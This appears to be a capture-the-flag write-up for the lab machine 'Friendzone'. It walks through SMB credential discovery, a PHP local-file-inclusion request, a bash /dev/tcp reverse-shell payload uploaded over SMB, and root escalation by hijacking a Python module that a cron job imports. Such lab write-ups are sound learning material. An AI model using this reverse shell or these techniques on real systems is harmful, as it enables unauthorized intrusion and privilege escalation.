# FRIENDZONE
### Info:
OS: Linux <br>
IP: 10.10.10.123<br>
Difficulty : Medium+ <br>
### Enumeration:
```
nmap -sC -sV -oA nmap 10.10.10.123
``` 
gives us the results : <br>
![alt text](https://i.imgur.com/eCYWqHv.png)
We start wih smb and check the shares: <br>
![alt text](https://i.imgur.com/254TNJJ.png) <br>
Via anonymous login on general and development we find a creds.txt
![alt text](https://i.imgur.com/ZchC8WR.png) <br>
Where we get creds for admin (used to login later)
```
root@kali:~/Desktop/boxes/Friendzone# cat creds.txt 
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```
Via port 53 we find:
![alt text](https://i.imgur.com/IZRLbzj.png)
### Exploitation:
Adding the domains from the port 53 in our `/etc/hosts` we can view the pages on port 443(https) <br>
We find a dashboard which needs login, and we use the creds found earlier and we reach `dashboard.php` <br>
Now adding our php rev shellcode in `Development` share via `smbclient`
```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.47/1234 0<&1'");
?>
```
and executing it via : <br>
![alt text](https://i.imgur.com/FFWB5iH.png) <br>
There is no .php added because we found 
```
GET /dashboard.php?image_id=b.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard
```
and it shows us in dashboard.php :
```
echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
```
that it is self including .php with our param. <br>
Finally we get /var/www on listening some port 1234.
Now in the same folder we find :
![alt text](https://i.imgur.com/HoGLTmi.png)
<br> Now we can ssh into the user `friend` 
### Privilege Escalation:
Running LinENum.sh shows us that there a cronjob running.
![alt text](https://i.imgur.com/4PT2o8B.png) <br>
It imports os and checking os.py : <br>
![alt text](https://i.imgur.com/t4O00M4.png) <br>
Now we can add our shellcode at the end os os.py and wait for the cron job to execute and get the root!
![alt text](https://i.imgur.com/F6hOpSk.png)
### Gained knowledge: <br>
Smb shares <br>
DNS enumeration via dig <br>
Crons
